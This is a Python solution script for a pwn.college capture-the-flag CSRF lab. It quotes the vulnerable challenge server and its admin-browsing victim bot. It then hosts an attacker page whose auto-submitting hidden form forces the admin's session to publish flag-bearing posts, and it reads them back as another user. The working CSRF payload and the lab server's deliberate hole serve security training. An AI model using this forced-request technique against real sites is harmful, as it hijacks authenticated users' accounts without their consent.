import os
import re
import requests
import sys
import time
from flask import Flask


"""
Theory:
Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted
actions on a web application in which they’re currently authenticated.
CSRF does not change the website code itself, bug rather lets the user use the website
in a way the user did not intend to. I.e. we could set up a malicious server and send the
respective link via email to the user. Once the user clicks on the link while being authenticated
to the website we are actually targeting with our attack, we might force the user to send a request
to the target website by returning a redirect or form request from our malicious server.
"""

'''
Server:
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")

@app.route("/login", methods=["POST"])
def challenge_login():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["username"] = username
    return flask.redirect("/")

@app.route("/draft", methods=["POST"])
def challenge_draft():
    if "username" not in flask.session:
        flask.abort(403, "Log in first!")

    content = flask.request.form.get("content", "")
    # https://www.sqlite.org/lang_insert.html
    db.execute(
        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
        (content, flask.session.get("username"), bool(flask.request.form.get("publish")))
    )
    return flask.redirect("/")

@app.route("/publish", methods=["POST"])
def challenge_publish():
    if "username" not in flask.session:
        flask.abort(403, "Log in first!")

    # https://www.sqlite.org/lang_update.html
    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [flask.session.get("username")])
    return flask.redirect("/")

@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, now XSS-free (for admin, at least)!<hr>\n"
    username = flask.session.get("username", None)
    if username == "admin":
        page += """<b>To prevent XSS, the admin does not view messages!</b>"""
    elif username:
        page += """
            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br><a href=publish>Publish your drafts!</a><hr>
        """

        for post in db.execute("SELECT * FROM posts").fetchall():
            page += f"""<h2>Author: {post["author"]}</h2>"""
            if post["published"]:
                page += post["content"] + "<hr>\n"
            else:
                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
    else:
        page += """
            <form action=login method=post>
              Username:<input type=text name=username>
              Password:<input type=text name=password>
              <input type=submit name=submit value=Login>
            </form><hr>
        """

    return page + "</body></html>"

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)

Victim:
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

open_ports = { s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == 'LISTEN' }
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)
challenge_url = "http://challenge.localhost:80/"
flag = open("/flag").read().strip()

print(f"Visiting {challenge_url}")
browser.get(challenge_url)

print("Logging in as admin...")
browser.find_element(By.NAME, "username").send_keys("admin")
browser.find_element(By.NAME, "password").send_keys(flag)
browser.find_element(By.NAME, "submit").submit()
time.sleep(3)
print("Logged in!")

print("Visiting the attacker's website (http://hacker.localhost:1337/)...")
browser.get("http://hacker.localhost:1337/")
time.sleep(3)

print("Visited! Go check if the attack worked!")
'''

def challenge():
	os.execv("/challenge/server", ["/challenge/server"])
	print("Error execv.")
	exit(1)

def attack():
	app = Flask(__name__)

	@app.route("/")
	def publish_flag():
		print(f"Forcing publish!")
		sys.stdout.flush()
		return ('<html><body>'
			'<form name=pub action=http://challenge.localhost:80/publish method="post">'
			'</form><script>document.forms["pub"].submit()</script>'
			'</body></html>'
			)

	app.run("hacker.localhost", 1337, use_reloader=False)
	exit(1)

pat0 = re.compile(r".*Running on http://challenge.localhost:80\n")
pat1 = re.compile(r".*Running on http://hacker.localhost:1337\n")
pat2 = re.compile(r".*Forcing publish!\n")
challenge_up = False
attacker_up = False
r1, w1 = os.pipe()

for proc in [challenge, attack]:
	pid = os.fork()

	if pid == -1:
		print("Error fork.")
		exit(1)

	if pid == 0:
		os.close(r1)

		os.dup2(w1, 1)
		os.close(w1)

		# stdout as stderr
		os.dup2(1, 2)

		proc()

os.close(w1)

read_file = os.fdopen(r1, "r")

while True:
	line = read_file.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		challenge_up = True

	m = pat1.match(line)
	if m:
		attacker_up = True

	if challenge_up and attacker_up:
		challenge_up = False
		attacker_up = False
		pid = os.fork()

		if pid == -1:
			print("Error fork.")
			exit(1)

		if pid == 0:
			os.execv("/challenge/victim", ["/challenge/victim"])
			print("Error execv.")
			exit(1)

	m = pat2.match(line)
	if m:
		time.sleep(3)
		url = "http://challenge.localhost:80/login"
		data = {"username": "hacker", "password": "1337"}
		resp = requests.post(url, data=data)
		print(resp.text)
